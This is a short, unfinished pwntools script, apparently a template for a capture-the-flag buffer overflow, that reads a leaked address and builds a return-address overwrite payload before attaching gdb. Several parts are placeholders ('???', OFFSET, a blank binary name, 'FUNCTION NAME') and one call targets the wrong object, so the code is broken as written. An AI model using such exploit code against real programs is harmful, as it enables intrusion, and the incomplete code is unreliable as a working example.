#!/usr/bin/env python3
import argparse
import pwn
#elf = gdb.debug(binary.path, gdbscript='b *main + 129')

elf = pwn.ELF("./   ")
p = elf.process()
buf = p.readuntil(">")
easy_addr = int(buf.split(b"WOW:")[1][:-1], 0)

payload =  b""
payload += b"D" * OFFSET
payload += pwn.p64(easy_addr + ???) #OR payload += p64(0x40061c) JUST HAS TO BE ANY return addr

payload += pwn.p64(easy_addr)

with open("payload", "wb") as fp:
    fp.write(payload)

g = pwn.gdb.attach(
    p,
    gdbscript="""
    b *FUNCTION NAME
    r < payload
    """,
    )
elf.sendline(payload)
elf.interactive()
   
